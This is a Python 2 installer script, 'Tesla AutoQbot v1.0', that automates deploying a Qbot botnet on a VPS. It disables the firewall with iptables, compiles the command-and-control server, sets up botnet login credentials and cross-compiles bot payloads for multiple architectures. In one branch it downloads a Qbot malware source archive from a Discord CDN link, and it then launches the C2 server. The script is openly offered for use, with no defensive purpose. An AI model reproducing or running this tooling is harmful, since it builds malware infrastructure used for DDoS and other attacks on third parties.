#!/usr/bin/python

#   Welcome to Tesla AutoQbot v1.0
#   Made by charge./switch
#   contact: charge.#6666
#   website: theswitcharchive.com
#   IG: @switchnets

#   \x1b[37m

#import hacks
import subprocess, time, sys, random


def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear')

print("\x1b[37m")
run('clear')
username = raw_input("""Welcome to \x1b[31mTesla AutoQbot v1.0
\x1b[37mPlease enter your desired username\x1b[37m: """)

run('clear')

intro = raw_input("""

\x1b[31m               `.-:/+osyyhhddddmmmmdddhhysso+/:-`
\x1b[31m       `-/oyhmNMMMMMMMMMMMMMMNNNNNNMMMMMMMMMMMMMMMNdhs+/-`
\x1b[31m .:oydNMMMMMMMNdhso+/:-..``           ``.--:/+oshdmMMMMMMMNhs+:`
\x1b[31m`dMMMMMmhs+:.          `..--              ..`       `-:+shmMMMMMmho:`
\x1b[31m `ys/.      .:/osyhmNMMMMMMMy`          `yMMMMNmhyo/:.     `-/ohNMMM+
\x1b[31m     `-+shmMMMMMMMMMMMMMMMMMMm-        :NMMMMMMMMMMMMMMmho/.     `:/
\x1b[31m    :NMMMMMMMMMMMMMMMMMMMMMMMMM+     `yMMMMMMMMMMMMMMMMMMMMMNho: 
\x1b[31m     .yMMMMMMMMmmdhhyyyyyyMMMMMMh`  /NMMMMMMMMMMMMMMMMMMMMMMMMMMy 
\x1b[31m       -yMMMh:            NMMMMMMm+yMMMMMMMy`  ``.-/oydMMMMMMMm/ 
\x1b[31m         `/s              yMMMMMMMMMMMMMMMM-           `+NMMh/
\x1b[31m                          /MMMMMMMMMMMMMMMd              .:`
\x1b[31m                          `MMMMMMMMMMMMMMM/
\x1b[31m                           dMMMMMMMMMMMMMm
\x1b[31m                           oMMMMMMMMMMMMM+
\x1b[31m                           -MMMMMMMMMMMMN`
\x1b[31m                            NMMMMMMMMMMMs
\x1b[31m                            yMMMMMMMMMMM.
\x1b[31m                            /MMMMMMMMMMy
\x1b[31m                            .MMMMMMMMMM-
\x1b[31m                             dMMMMMMMMd
\x1b[31m                             sMMMMMMMM/
\x1b[31m                             :MMMMMMMm
\x1b[31m                              NMMMMMM+
\x1b[31m                              hMMMMMN`
\x1b[31m                              +MMMMMo
\x1b[31m                              .MMMMM`
\x1b[31m                               mMMMy
\x1b[31m                               sMMM-
\x1b[31m                               :MMh
\x1b[31m                                NM:
\x1b[31m                                hm
\x1b[31m                                +/
\x1b[31m                                 `

                   \x1b[37mWelcome to \x1b[31mTesla AutoQbot v1.0
                      \x1b[96mMade by \x1b[37mcharge.

Please press enter when ready: """)
time.sleep(2)
run('clear')

print("""

                           \x1b[37mWelcome to \x1b[31mTesla AutoQbot v1.0
                     \x1b[37mPlease select one of the following options:

                     \x1b[31m1\x1b[37m) Setup, Configure, and Install Qbot
                     \x1b[31m2\x1b[37m) More Information
                     \x1b[31m3\x1b[37m) Credits""")

cmdline = raw_input("\x1b[96m" + username + "\x1b[37m@\x1b[31mTesla \x1b[37m~]# ")

if cmdline == "1":
    time.sleep(2)
    run('clear')
    time.sleep(2)
    yesorno = raw_input("""Before starting, Tesla AutoQbot will need a bit of information from you...
NOTE: If you already have a Qbot source downloaded and on your VPS, Tesla AutoQbot will need some information from you.
If you do not have a Qbot Source, simply press "n" and Tesla AutoQbot will download and install one for you.
Do you already have a Qbot source downloaded and on your VPS? (y/n): """)
    if yesorno == "y":
        clientinfo = raw_input("\nWhat is the name of your Qbot source's client? (With the .c): ")
        serverinfo = raw_input("What is the name of your Qbot source's serverside? (With the .c): ")
        ccinfo = raw_input("What is the name of your Qbot source's cross compiler? (With the .py): ")
        botport = raw_input("What is your Qbot Source's BotPort?: ")
        cncport = raw_input("What would you like your CNCPort to be for your botnet?: ")
        user = raw_input("What would you like your Botnet Login Username to be?: ")
        userpass = raw_input("What would you like your Botnet Login Password to be?: ")
        ipinfo = raw_input("What is your Server IP?: ")
        print("Thankyou for the information.")
        time.sleep(2)
        print("")
        print("\x1b[31mATTENTION\x1b[37m: \x1b[31mTesla AutoQbot \x1b[37mwill now take control, \x1b[31mplease do not touch your mouse or keyboard.")
        confirm = raw_input("\x1b[37mPlease press enter when you are ready, and your Qbot will be setup for you: ")
        print("")
        print("Entering Ludicrous Mode...")
        time.sleep(1)
        
        print("")
        print("\x1b[31mInstalling Dependencies...\x1b[37m")
        print("")
        
        run('yum install gcc screen nano httpd python perl -y; ulimit -n 99999')
        
        print("")
        print("\x1b[32mDependencies Installed!")
        print("")
        print("\x1b[31mStopping IPTables...\x1b[37m")
        print("")
        
        run('iptables -F; service iptables stop')
        
        print("")
        print("\x1b[32mIPTables Stopped!")
        print("")
        print("\x1b[31mCompiling Serverside...\x1b[37m")
        print("")
        
        run('gcc ' +serverinfo+ ' -o server -pthread')
        
        print("")
        print("\x1b[32mServerside Compiled!\x1b[37m")
        print("")
        print("\x1b[31mSetting up your botnet login...\x1b[37m")
        print("")
        
        run('echo ' + user + ' ' + userpass +' >> login.txt')
        
        print("")
        print("\x1b[32mLogin Setup!\x1b[37m")
        print("")
        print("\x1b[31mPreparing to Cross Compile your source... (Press Y when it asks to 'Get Archs')\x1b[37m")
        print("")
        time.sleep(3)
        run('python ' + ccinfo + ' ' +clientinfo + ' ' + ipinfo)
        
        print("")
        print("\x1b[31mPlease save your payload. You have 20 seconds before Tesla AutoQbot will move on..\x1b[37m")
        print("")
        for i in xrange(20,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1)
             # sleep so we dont kill ourselves :hahayes:
        print("")
        print("\x1b[31mPreparing to screen your CNC... Once the screen goes black, detach by doing CTRL A+D\x1b[37m")
        print("")
        time.sleep(5)
        print("\x1b[32mScreening NOW!")
        time.sleep(1)
        run('screen ./server ' + botport + ' 850 ' +cncport)
        
        run('clear')
        
        print("")
        print("Thankyou for using Tesla AutoQbot v1.0")
        print("Your Qbot has been setup and is screened on port " +cncport)
        print("Made by charge.")
        print("")
        print("Tesla AutoQbot Shutting Down...")
        for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        print("")
        exit()
    
    if yesorno == "n":
        time.sleep(2)
        print("")
        print("\x1b[31mATTENTION\x1b[37m: \x1b[31mTesla AutoQbot \x1b[37mwill now take control, \x1b[31mplease do not touch your mouse or keyboard.")
        confirm = raw_input("\x1b[37mPlease press enter when you are ready, and your Qbot will be setup for you: ")
        print("")
        print("Entering Ludicrous Mode...")
        time.sleep(1)
        
        print("")
        print("\x1b[31mDownloading Qbot Source...\x1b[37m")
        print("")

        run('wget https://cdn.discordapp.com/attachments/586514958548860958/586580593467326485/Yakuza.zip')
        run('unzip Yakuza.zip')
        run('mv Yakuza/* /root')
        run('rm -rf Yakuza/')

        print("\x1b[32mQbot Source Downloaded!\x1b[37m")